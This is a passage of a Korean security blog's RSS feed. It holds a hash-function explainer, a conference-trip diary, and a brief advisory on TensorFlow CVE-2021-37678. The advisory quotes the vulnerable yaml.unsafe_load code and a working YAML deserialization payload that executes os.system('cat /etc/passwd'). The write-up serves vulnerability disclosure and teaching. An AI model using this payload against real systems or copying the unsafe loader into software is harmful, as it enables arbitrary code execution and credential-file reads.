      <category domain="https://hackyboiz.github.io/tags/biometric/">biometric</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/11/j0ker/2021-09-11/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] Hash Function</title>
      <link>https://hackyboiz.github.io/2021/09/10/poosic/Hash-Function/</link>
      <guid>https://hackyboiz.github.io/2021/09/10/poosic/Hash-Function/</guid>
      <pubDate>Fri, 10 Sep 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p&gt;&amp;#xD574;&amp;#xC2DC; &amp;#xD568;&amp;#xC218;&amp;#xB294; &amp;#xC784;&amp;#xC758;&amp;#xC758; &amp;#xAE38;&amp;#xC774;&amp;#xB97C; &amp;#xAC16;&amp;#xB294; &amp;#xC784;&amp;#xC758</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p>&#xD574;&#xC2DC; &#xD568;&#xC218;&#xB294; &#xC784;&#xC758;&#xC758; &#xAE38;&#xC774;&#xB97C; &#xAC16;&#xB294; &#xC784;&#xC758;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xACE0;&#xC815;&#xB41C; &#xAE38;&#xC774;&#xC758; &#xB370;&#xC774;&#xD130;&#xB85C; &#xB9E4;&#xD551;&#xD558;&#xB294; &#xD568;&#xC218;&#xB97C; &#xB9D0;&#xD55C;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xD574;&#xC2DC; &#xD568;&#xC218;&#xB97C; &#xC801;&#xC6A9;&#xD558;&#xC5EC; &#xB098;&#xC628; &#xACE0;&#xC815;&#xB41C; &#xAE38;&#xC774;&#xC758; &#xAC12;&#xC744; &#xD574;&#xC2DC;&#xAC12;&#xC774;&#xB77C;&#xACE0; &#xD55C;&#xB2E4;. &#xC774; &#xAC12;&#xC740; &#xB610;&#xD55C; &#xD574;&#xC2DC; &#xCF54;&#xB4DC;, &#xD574;&#xC2DC;&#xC12C;(sum), &#xCCB4;&#xD06C;&#xC12C;[1] &#xB4F1;&#xC73C;&#xB85C;&#xB3C4; &#xBD88;&#xB9B0;&#xB2E4;.</p></blockquote><p>&#xC704;&#xB294; &#xC704;&#xD0A4;&#xBC31;&#xACFC;&#xC5D0;&#xC11C; &#xC815;&#xC758;&#xD55C; &#xD574;&#xC26C; &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;. &#xC6B0;&#xB9AC;&#xAC00; &#xD3C9;&#xC18C;&#xC5D0; &#xB9D0;&#xD558;&#xB294; &#xD574;&#xC2DC;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xC554;&#xD638;&#xB97C; &#xC704;&#xD55C; &#xD2B9;&#xC815;&#xD55C; &#xD568;&#xC218;&#xB85C;&#xC368;, &#xD574;&#xC2DC; &#xAC12;&#xC740; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB85C; &#xC554;&#xD638;&#xD654;&#xB41C; &#xC554;&#xD638;&#xBB38;&#xC744; &#xB9D0;&#xD55C;&#xB2E4;&#xACE0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xD574;&#xC2DC;&#xAC00; &#xBB34;&#xC5C7;&#xC778;&#xC9C0;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC558;&#xC73C;&#xB2C8; &#xD574;&#xC2DC;&#xC758; &#xD2B9;&#xC9D5;&#xC5D0; &#xB300;&#xD574; &#xC0B4;&#xD3B4; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">1.</span>key:Hack&amp;Life -&gt; hash() -&gt; <span class="hljs-number">01</span>cada24c9c630231ded9647ba043f15<span class="hljs-number">2.</span>key:jjangjjang man!! -&gt; hash() -&gt;e2cdcf3f68ded41c2e2725df7fb03d65</code></pre><p>&#xD574;&#xC2DC;&#xC758; &#xCCAB; &#xBC88;&#xC9F8; &#xD2B9;&#xC9D5;&#xC740; &#xC5B4;&#xB5A4; &#xAE38;&#xC774;&#xC758; &#xB370;&#xC774;&#xD130;&#xAC00; key&#xAC12;&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xB354;&#xB77C;&#xB3C4; <strong>&#xC77C;&#xC815;&#xD55C; &#xAE38;&#xC774;&#xC758; hash value&#xB85C; &#xBCC0;&#xD658;&#xD574;&#xC900;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</strong> &#xC704;&#xC758; &#xC608;&#xC2DC;&#xB294; MD5 &#xD574;&#xC2DC; &#xD568;&#xC218;&#xB85C; 2&#xAC00;&#xC9C0; &#xAE38;&#xC774;&#xAC00; &#xB2E4;&#xB978; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC554;&#xD638;&#xD654;&#xD55C; &#xC608;&#xC2DC;&#xC785;&#xB2C8;&#xB2E4;. &#xB450; &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xAE38;&#xC774;&#xAC00; &#xB2E4;&#xB974;&#xB354;&#xB77C;&#xB3C4; &#xACB0;&#xACFC;&#xAC12;&#xC73C;&#xB85C; &#xB098;&#xC628; hash value&#xC758; &#xAE38;&#xC774;&#xB294; &#xAC19;&#xC740; &#xAC83;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">1.</span>key:Hack&amp;Life -&gt; hash() -&gt; hash value:<span class="hljs-number">01</span>cada24c9c630231ded9647ba043f15<span class="hljs-number">2.</span>key:Hack&amp;life -&gt; hash() -&gt; hash value:c07adc3f60f886620e35561ee7509be6</code></pre><p>&#xD574;&#xC2DC;&#xC758; &#xB450;&#xBC88;&#xC9F8; &#xD2B9;&#xC9D5;&#xC740; <strong>&#xC785;&#xB825; &#xAC12;&#xC774; &#xC870;&#xAE08;&#xB9CC; &#xBCC0;&#xACBD;</strong>&#xB418;&#xB354;&#xB77C;&#xB3C4; <strong>&#xC644;&#xC804;&#xD788; &#xB2E4;&#xB978; &#xACB0;&#xACFC; &#xAC12;&#xC744; &#xB3C4;&#xCD9C;</strong>&#xD574;&#xB0B8;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC704;&#xC758; &#xC608;&#xC2DC;&#xC5D0;&#xC11C; &#xB450; &#xBB38;&#xC790;&#xC5F4;&#xC740; &#xBB38;&#xC790;1&#xAC1C;&#xC758; &#xCC28;&#xC774;&#xB97C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xACB0;&#xACFC;&#xB85C; &#xB3C4;&#xCD9C;&#xB41C; &#xD574;&#xC2DC;&#xAC12;&#xC740; &#xC804;&#xD600; &#xB2E4;&#xB978; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xC2DC;&#xC758; &#xC138; &#xBC88;&#xC9F8; &#xD2B9;&#xC9D5;&#xC740; <strong>&#xD574;&#xC2DC;&#xAC12;&#xC774; &#xAC19;&#xC740; &#xC785;&#xB825;&#xAC12; &#xB450; &#xAC1C;&#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC5C6;&#xB294; &#xCDA9;&#xB3CC; &#xC800;&#xD56D;&#xC131;</strong>&#xC774;&#xB77C;&#xB294; &#xD2B9;&#xC9D5;&#xC744; &#xAC00;&#xC9C4;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xC2DC; &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xB2E4;&#xB978; &#xC785;&#xB825;&#xAC12;&#xC5D0; &#xB300;&#xD574; &#xAC19;&#xC740; &#xCD9C;&#xB825;&#xAC12;&#xC774; &#xC5C6;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC704;&#xC758; md5 &#xD574;&#xC2DC; &#xD568;&#xC218;&#xCC98;&#xB7FC; &#xC18C;&#xBB38;&#xC790; &#xC54C;&#xD30C;&#xBCB3;&#xACFC; &#xC22B;&#xC790;&#xB97C; &#xC870;&#xD569;&#xD55C; 32&#xC790;&#xB9AC; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xD574;&#xC2DC;&#xAC12;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD560; &#xB54C; &#xADF8; &#xACBD;&#xC6B0;&#xC758; &#xC218;&#xAC00; &#xB9E4;&#xC6B0; &#xC791;&#xC544; &#xBB34;&#xC2DC;&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCDA9;&#xB3CC; &#xC800;&#xD56D;&#xC131;&#xC744; &#xAC00;&#xC9C4;&#xB2E4;&#xACE0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xC2DC;&#xC758; &#xB9C8;&#xC9C0;&#xB9C9; &#xD2B9;&#xC9D5;&#xC740; <strong>&#xC8FC;&#xC5B4;&#xC9C4; &#xD574;&#xC2DC; &#xAC12;&#xC5D0; &#xB300;&#xD55C; key&#xAC12;&#xC744; &#xCC3E;&#xC744; &#xC218; &#xC5C6;&#xB294; &#xC5ED;&#xC0C1; &#xC800;&#xD56D;&#xC131;</strong>&#xC774;&#xB77C;&#xB294; &#xD2B9;&#xC9D5;&#xC744; &#xAC00;&#xC9C4;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC989;, &#xC6B0;&#xB9AC;&#xC5D0;&#xAC8C; &#xD574;&#xC2DC;&#xAC12;&#xC774; &#xC8FC;&#xC5B4;&#xC84C;&#xC744; &#xB54C;  &#xD574;&#xC2DC;&#xB294; &#xB2E8;&#xBC29;&#xD5A5; &#xC554;&#xD638;&#xD654; &#xD568;&#xC218;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774; &#xD574;&#xC2DC; &#xAC12;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; key(&#xD639;&#xC740; data)&#xAC00; &#xBB34;&#xC5C7;&#xC778;&#xC9C0; &#xC54C; &#xC218; &#xC5C6;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; <code>hash()</code>&#xB97C; &#xAC70;&#xCCD0; &#xD574;&#xC2DC; &#xAC12;&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xD574; &#xB193;&#xB294;&#xB2E4;&#xBA74; &#xD574;&#xC2DC;&#xAC12;&#xC774; &#xC720;&#xCD9C;&#xB418;&#xB354;&#xB77C;&#xB3C4; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xAC00; &#xC720;&#xCD9C;&#xB418;&#xC9C0; &#xC54A;&#xC544; &#xC720;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
      
      <category domain="https://hackyboiz.github.io/tags/Hash/">Hash</category>
      
      <category domain="https://hackyboiz.github.io/tags/Hash-Function/">Hash Function</category>
      
      <category domain="https://hackyboiz.github.io/tags/%ED%95%B4%EC%8B%9C/">해시</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/10/poosic/Hash-Function/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-37678: Google TensorFlow의 임의 코드 실행 취약점과 YAML 지원 중단</title>
      <link>https://hackyboiz.github.io/2021/09/09/l0ch/2021-09-09/</link>
      <guid>https://hackyboiz.github.io/2021/09/09/l0ch/2021-09-09/</guid>
      <pubDate>Thu, 09 Sep 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/tensorflow/tensorflow/security/advisor</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-r6jx-9g48-2r5r">Arbitrary code execution due to YAML deserialization</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Google TensorFlow &lt; 2.6.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>TensorFlow&#xB294; &#xBA38;&#xC2E0;&#xB7EC;&#xB2DD;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; Google&#xC758; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xD50C;&#xB7AB;&#xD3FC;&#xC785;&#xB2C8;&#xB2E4;. TensorFlow&#xC758; yaml &#xC9C0;&#xC6D0; &#xBAA8;&#xB4C8;&#xC5D0;&#xC11C; &#xC5ED;&#xC9C1;&#xB82C;&#xD654; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xACE0; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; CVE-2021-37678&#xB85C; &#xBA85;&#xBA85;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>TensorFlow&#xC758; Keras &#xBAA8;&#xB378; <code>model_from_yaml</code> &#xD568;&#xC218;&#xB294; yaml &#xD30C;&#xC77C;&#xC744; &#xB85C;&#xB4DC;&#xD574; &#xC5ED;&#xC9C1;&#xB82C;&#xD654;&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-meta">@keras_export(&apos;keras.models.model_from_yaml&apos;)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">model_from_yaml</span>(<span class="hljs-params">yaml_string, custom_objects=None</span>):</span>  <span class="hljs-keyword">if</span> yaml <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:    <span class="hljs-keyword">raise</span> ImportError(<span class="hljs-string">&apos;Requires yaml module installed (`pip install pyyaml`).&apos;</span>)  <span class="hljs-keyword">try</span>:    <span class="hljs-comment"># PyYAML 5.x+</span>    config = yaml.unsafe_load(yaml_string)  <span class="hljs-keyword">except</span> AttributeError:    config = yaml.load(yaml_string)  <span class="hljs-keyword">from</span> tensorflow.python.keras.layers <span class="hljs-keyword">import</span> deserialize  <span class="hljs-comment"># pylint: disable=g-import-not-at-top</span>  <span class="hljs-keyword">return</span> deserialize(config, custom_objects=custom_objects)</code></pre><p>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xD558;&#xB294; yaml&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xBD80;&#xC871;&#xD574; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xBA74; &#xC544;&#xB798; <code>cat /etc/passwd</code>&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; <code>model_from_yaml</code> &#xD568;&#xC218;&#xC758; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; &#xC804;&#xB2EC;&#xD574; &#xC2E4;&#xD589;&#xD558;&#xB294; PoC&#xC640; &#xAC19;&#xC774; &#xC784;&#xC758;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> tensorflow.keras <span class="hljs-keyword">import</span> modelspayload = <span class="hljs-string">&apos;&apos;&apos;</span><span class="hljs-string">!!python/object/new:type</span><span class="hljs-string">args: [&apos;z&apos;, !!python/tuple [], {&apos;extend&apos;: !!python/name:exec }]</span><span class="hljs-string">listitems: &quot;__import__(&apos;os&apos;).system(&apos;cat /etc/passwd&apos;)&quot;</span><span class="hljs-string">&apos;&apos;&apos;</span>  models.model_from_yaml(payload)</code></pre><p>Google&#xC740; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC218;&#xC815;&#xD558;&#xB294; <a href="https://github.com/tensorflow/tensorflow/commit/23d6383eb6c14084a8fc3bdf164043b974818012">&#xCEE4;&#xBC0B;&#xC5D0;&#xC11C;</a> YAML &#xC9C0;&#xC6D0;&#xC744; &#xC911;&#xB2E8;&#xD558;&#xACE0; &#xD328;&#xCE58;&#xB97C; 2.6.0&#xC5D0;&#xC11C; &#xB9B4;&#xB9AC;&#xC988;&#xD568;&#xACFC; &#xB3D9;&#xC2DC;&#xC5D0; &#xC774;&#xC804; &#xBC84;&#xC804;&#xC5D0;&#xB3C4; backporting &#xD558;&#xACA0;&#xB2E4;&#xACE0; &#xBC1D;&#xD614;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/deserialization/">deserialization</category>
      
      <category domain="https://hackyboiz.github.io/tags/google/">google</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/tensorflow/">tensorflow</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/09/l0ch/2021-09-09/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Daily-Life] 부산까지 가서 발표한 썰 푼다, 시원포럼 발표 후기</title>
      <link>https://hackyboiz.github.io/2021/09/08/l0ch/securityone_forum_review/</link>
      <guid>https://hackyboiz.github.io/2021/09/08/l0ch/securityone_forum_review/</guid>
      <pubDate>Wed, 08 Sep 2021 13:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! L0ch&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC77C;&amp;#xC0C1; &amp;#xAE00;&amp;#xB85C;&amp;#xB294; &amp;#xC624;&amp;#xB79C;&amp;#xB9CC</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! L0ch&#xC785;&#xB2C8;&#xB2E4;. &#xC77C;&#xC0C1; &#xAE00;&#xB85C;&#xB294; &#xC624;&#xB79C;&#xB9CC;&#xC5D0; &#xB3CC;&#xC544;&#xC654;&#xB124;&#xC694;. &#x2192; &#xB9E8;&#xB0A0; &#xC5F0;&#xAD6C;&#xC5D0; &#xCC0C;&#xB4E4;&#xC5B4; &#xC0B4;&#xC558;&#xB2E4;&#xB294; &#xB73B;..</p><p>&#xC5BC;&#xB9C8; &#xC804; Fabu1ous&#xC640; &#xD568;&#xAED8; &#xBD80;&#xC0B0; &#xBCA1;&#xC2A4;&#xCF54;&#xC5D0;&#xC11C; &#xC5F4;&#xB9AC;&#xB294; 2021 &#xC0AC;&#xC774;&#xBC84;&#xBCF4;&#xC548; &#xCEE8;&#xD37C;&#xB7F0;&#xC2A4;&#xC5D0;&#xC11C; &#xBC1C;&#xD45C;&#xB97C; &#xD558;&#xACE0; &#xC654;&#xB294;&#xB370;&#xC694;, &#xAC04;&#xB2E8;&#xD55C; &#xD6C4;&#xAE30;&#xB97C; &#xB0A8;&#xACA8;&#xBCF4;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4; &#x314E;&#x314E;</p><h1 id="&#xAC11;&#xC790;&#xAE30;-&#xBC1C;&#xD45C;&#xB97C;-&#xD558;&#xB77C;&#xAD6C;&#xC694;"><a href="#&#xAC11;&#xC790;&#xAE30;-&#xBC1C;&#xD45C;&#xB97C;-&#xD558;&#xB77C;&#xAD6C;&#xC694;" class="headerlink" title="&#xAC11;&#xC790;&#xAE30; &#xBC1C;&#xD45C;&#xB97C; &#xD558;&#xB77C;&#xAD6C;&#xC694;?"></a>&#xAC11;&#xC790;&#xAE30; &#xBC1C;&#xD45C;&#xB97C; &#xD558;&#xB77C;&#xAD6C;&#xC694;?</h1><p>&#xC5B4;&#xB290; &#xD3C9;&#xD654;&#xB85C;&#xC6B4; &#xC8FC;&#xB9D0;, &#xC2AC;&#xB799;&#xC5D0; &#xC5B4;&#xB5A4; &#xC0AC;&#xC9C4; &#xD558;&#xB098;&#xAC00; &#xC62C;&#xB77C;&#xC624;&#xB294;&#xB370;..</p><p><img src="/2021/09/08/l0ch/securityone_forum_review/Screen_Shot_2021-09-07_at_17.13.31.png" alt="Screen Shot 2021-09-07 at 17.13.31.png"></p><p>Security One&#xC5D0;&#xC11C; 2021 &#xC0AC;&#xC774;&#xBC84;&#xBCF4;&#xC548; &#xCEE8;&#xD37C;&#xB7F0;&#xC2A4; &#xB54C; &#xC9C4;&#xD589;&#xD560; &#xC2DC;&#xC6D0;&#xD3EC;&#xB7FC;&#xC758; &#xBC1C;&#xD45C;&#xC790;&#xB97C; &#xBAA8;&#xC9D1;&#xD55C;&#xB2E4;&#xB294; &#xB0B4;&#xC6A9;&#xC758; &#xCEA1;&#xCC98;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC804; &#xC8FC;&#xB9D0;&#xC5D0; &#xB9E4;&#xC6B0; &#xBC14;&#xC058;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2AC;&#xB799;&#xC744; &#xBCF4;&#xC9C0; &#xC54A;&#xC558;&#xC8E0;. &#xBB50;&#xD558;&#xB290;&#xB77C; &#xBC14;&#xBE74;&#xB0D0;&#xAD6C;&#xC694;?</p><p>.</p><p>.</p><p><img src="/2021/09/08/l0ch/securityone_forum_review/Untitled.png" alt="Untitled"></p><blockquote><p>&#xC544;&#xD06C;&#xB77C;&#xC2DC;&#xC544; &#xC5EC;&#xD589;&#xD558;&#xB290;&#xB77C; &#xBC14;&#xBE74;&#xC2B5;&#xB2C8;&#xB2E4;!</p></blockquote><p>&#xB2F9;&#xB2F9;&#xD558;&#xAC8C; &#xC6D4;&#xC694;&#xC77C;&#xC5D0; &#xCD9C;&#xADFC;&#xD574;&#xC11C; &#xC2E0;&#xCCAD; &#xB9C8;&#xAC10;&#xC77C;&#xC744; &#xBCF4;&#xB2C8;&#xAE4C; &#xB9C8;&#xAC10;&#xC77C;&#xAE4C;&#xC9C0; &#xB2F9;&#xC7A5; 3&#xC77C;&#xC774; &#xB0A8;&#xC544;&#xC11C; &#xD638;&#xB2E4;&#xB2E5; &#xC8FC;&#xC81C;&#xB97C; &#xC815;&#xD558;&#xACE0; &#xBC1C;&#xD45C;&#xC790;&#xB8CC;&#xBD80;&#xD130; &#xB9CC;&#xB4E4;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xD589;&#xD788; &#xC608;&#xC804;&#xC5D0; &#xC708;&#xB3C4;&#xC6B0; &#xD328;&#xCE58;&#xB97C; &#xB514;&#xD551;&#xBD84;&#xC11D;&#xD55C; &#xC5F0;&#xAD6C;&#xAE00;&#xC778;</p><p><a href="https://hackyboiz.github.io/2020/11/15/l0ch/windows-patch-diffing-part1/">[Research] Windows Patch Diffing &#xB9DB;&#xBCF4;&#xAE30; Part 1</a> </p><p><a href="https://hackyboiz.github.io/2020/11/29/l0ch/windows-patch-diffing-part2/">[Research] Windows Patch Diffing &#xB9DB;&#xBCF4;&#xAE30; Part 2</a> </p><p>&#xC774; &#xB450; &#xAC1C;&#xB97C; &#xC4F0;&#xBA74;&#xC11C; &#xB098;&#xC911;&#xC5D0; &#xBC1C;&#xD45C;&#xC8FC;&#xC81C;&#xB85C; &#xD574;&#xB3C4; &#xC88B;&#xC744;&#xAC83; &#xAC19;&#xB2E4;~ &#xB77C;&#xB294; &#xC774;&#xC57C;&#xAE30;&#xB97C; &#xD55C; &#xC801;&#xC774; &#xC788;&#xC5B4; &#xC8FC;&#xC81C;&#xB294; &#xAE08;&#xBC29; &#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC911;&#xAC04;&#xC5D0; &#xB0B4;&#xC6A9;&#xB3C4; &#xC870;&#xAE08; &#xCD94;&#xAC00;&#xD560; &#xACB8; Windows &#xD504;&#xB9B0;&#xD130; &#xC2A4;&#xD480;&#xB7EC; API &#xCDE8;&#xC57D;&#xC810;&#xC778; CVE-2020-0986&#xACFC; &#xCDE8;&#xC57D;&#xC810; &#xD328;&#xCE58;&#xB97C; bypass&#xD558;&#xB294; CVE-2021-1648&#xC744; patch diffing&#xC73C;&#xB85C; &#xC9C1;&#xC811; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xB0B4;&#xC6A9;&#xB3C4; &#xB123;&#xC73C;&#xBA74; &#xC870;&#xAE08; &#xC5EC;&#xC720;&#xB86D;&#xAC8C; &#xC900;&#xBE44;&#xD558;&#xACA0;&#xAD6C;&#xB098; &#xC0DD;&#xAC01;&#xD588;&#xC5B4;&#xC694;. </p><p><img src="/2021/09/08/l0ch/securityone_forum_review/Screen_Shot_2021-09-07_at_20.30.34.png" alt="Screen Shot 2021-09-07 at 20.30.34.png"></p><p>&#xC5B4;..&#xC5EC;&#xC720;&#xB86D;&#xAC8C;&#x2026;?</p><p><img src="/2021/09/08/l0ch/securityone_forum_review/Screen_Shot_2021-09-07_at_20.45.42.png" alt="Screen Shot 2021-09-07 at 20.45.42.png"></p><p>43&#xD398;&#xC774;&#xC9C0;.. &#xC5B4;&#xB77C;?</p><p><img src="/2021/09/08/l0ch/securityone_forum_review/Screen_Shot_2021-09-07_at_19.35.45.png" alt="Screen Shot 2021-09-07 at 19.35.45.png"></p><blockquote><p>&#xACB0;&#xAD6D; &#xC5EC;&#xC720;&#xB86D;&#xAC8C; 3&#xC77C; &#xBC24;&#xC0D8;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p></blockquote><h1 id="&#xAC00;&#xC790;-&#xBD80;&#xC0B0;&#xC73C;&#xB85C;"><a href="#&#xAC00;&#xC790;-&#xBD80;&#xC0B0;&#xC73C;&#xB85C;" class="headerlink" title="&#xAC00;&#xC790; &#xBD80;&#xC0B0;&#xC73C;&#xB85C;!"></a>&#xAC00;&#xC790; &#xBD80;&#xC0B0;&#xC73C;&#xB85C;!</h1><p><del>&#xBCBC;&#xB77D;&#xCE58;&#xAE30;&#xB85C;</del> &#xC5F4;&#xC2EC;&#xD788; &#xC900;&#xBE44;&#xD55C; &#xB355;&#xC5D0; &#xB2E4;&#xD589;&#xD788; &#xBC1C;&#xD45C;&#xC790; &#xC120;&#xC815; &#xACB0;&#xACFC;&#xC5D0; &#xC800;&#xC640; Fabu1ous &#xB458; &#xB2E4; &#xBC1C;&#xD45C;&#xC790;&#xB85C; &#xC120;&#xC815;&#xC774; &#xB418;&#xC5C8;&#xB354;&#xB77C;&#xAD6C;&#xC694;! &#xC5BC;&#xB978; &#xAE40;&#xD3EC;&#xACF5;&#xD56D;&#xC5D0;&#xC11C; &#xAE40;&#xD574;&#xACF5;&#xD56D;&#xC73C;&#xB85C; &#xAC00;&#xB294; &#xD56D;&#xACF5;&#xD3B8;&#xC744; &#xC608;&#xB9E4;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC1C;&#xD45C;&#xAC00; 1&#xC2DC;&#xBD80;&#xD130;&#xC600;&#xC73C;&#xB2C8; &#xC801;&#xC5B4;&#xB3C4; 9&#xC2DC; &#xBE44;&#xD589;&#xAE30;&#xB294; &#xD0C0;&#xC57C; &#xC2DC;&#xAC04;&#xC744; &#xB9DE;&#xCD9C; &#xC218; &#xC788;&#xC5C8;&#xC8E0;. &#xAE40;&#xD3EC;&#xACF5;&#xD56D;&#xC5D0;&#xC11C; 15&#xBD84; &#xAC70;&#xB9AC;&#xC5D0; &#xC0B4;&#xAE34; &#xD558;&#xC9C0;&#xB9CC; &#xADF8;&#xB798;&#xB3C4; 7&#xC2DC;&#xC5D0; &#xC77C;&#xC5B4;&#xB098;&#xB294;&#xAC70; &#xB108;&#xBB34; &#xD798;&#xB4EC; &#x3160;&#x3160; </p><blockquote><p>&#xC800; &#xC0C8;x.. &#xC544;&#xB2C8; &#xC800; &#xD615;&#xC774;?  (Fabu1ous, &#xACF5;&#xD56D;&#xAE4C;&#xC9C0; &#xD55C;&#xC2DC;&#xAC04; &#xBC18; &#xAC70;&#xB9AC;)</p></blockquote><p>&#xC544;&#xBB34;&#xD2BC;! &#xAE40;&#xD574;&#xACF5;&#xD56D;&#xC73C;&#xB85C; &#xAC00;&#xB294; &#xBE44;&#xD589;&#xAE30;&#xB97C; &#xD0C0;&#xACE0; &#xBD80;&#xC0B0;&#xC73C;&#xB85C; &#xCD9C;&#xBC1C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;! (Photo by Fabu1ous)</p><p><img src="/2021/09/08/l0ch/securityone_forum_review/Untitled%201.png" alt="Untitled"></p><p>&#xD55C;&#xC2DC;&#xAC04; 